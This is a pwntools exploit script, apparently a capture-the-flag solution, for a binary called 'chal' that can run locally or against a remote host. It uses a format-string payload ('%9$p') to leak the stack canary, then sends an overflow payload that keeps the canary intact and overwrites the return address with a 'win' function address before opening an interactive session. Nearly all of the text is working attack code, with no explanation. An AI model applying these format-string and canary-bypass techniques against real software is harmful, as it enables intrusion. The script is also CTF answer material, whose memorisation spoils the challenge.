from pwn import *
import sys
context.log_level = 'debug'
context.arch = 'amd64'
if len(sys.argv) == 1:
    r = process('./chal')
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print('Usage: python3 {} [GDB | remote]'.format(sys.argv[0]))
    sys.exit(1)
s = lambda data: r.send(data)
sl = lambda data: r.sendline(data)
sa = lambda x, y: r.sendafter(x, y)
sla = lambda x, y: r.sendlineafter(x, y)
ru = lambda delims, drop=True: r.recvuntil(delims, drop)
uu32 = lambda data, num: u32(r.recvuntil(data)[-num:].ljust(4, b'\x00'))
uu64 = lambda data, num: u64(r.recvuntil(data)[-num:].ljust(8, b'\x00'))
leak = lambda name, addr: log.success('{} = {}'.format(name, addr))
l64 = lambda : u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
l32 = lambda : u32(r.recvuntil('\xf7')[-4:].ljust(4, b'\x00'))

win = 0x0000000000401187
sla('otherwise press 0: ', b'1')
payload = b'%9$p'
sla('! ', payload)
ru(b'\n')
canary = int(r.recvuntil(b'\n', drop=True), 16)
leak('canary', hex(canary))
payload2 = b'AAAABBBBCC' + p64(canary) + b'AAAABBBB' + p64(win)
sla('Goodbye!', payload2)
r.interactive()
